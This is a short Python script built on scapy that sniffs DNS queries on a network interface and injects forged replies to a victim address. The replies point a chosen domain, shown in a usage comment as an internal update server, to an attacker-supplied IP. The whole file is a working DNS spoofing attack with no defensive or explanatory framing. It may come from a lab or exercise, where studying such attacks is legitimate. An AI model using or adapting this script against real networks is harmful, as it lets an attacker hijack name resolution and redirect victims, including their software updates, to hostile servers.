from scapy.all import *
import os
import sys

def respond_to_dns_req(pkt):
    spf_resp = IP(src = pkt[IP].dst, dst=ip_victim)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd, ancount=1, an=DNSRR(rrname=pkt[DNS].qd.qname, type=pkt[DNS].qd.qtype, rdata=ip_target))
    send(spf_resp, verbose=0, iface=interface)

# python3 dns_inject.py "br-dns" "192.168.124.20" "update-server.updateserver.corp." "1.2.3.4"
interface = sys.argv[1]
ip_victim = sys.argv[2]
domain = sys.argv[3]
ip_target = sys.argv[4]

sniff(filter="udp port 53", iface=interface, lfilter=lambda pkt: DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount== 0  and domain in str(pkt["DNS Question Record"].qname), prn=respond_to_dns_req)                                                                                                  
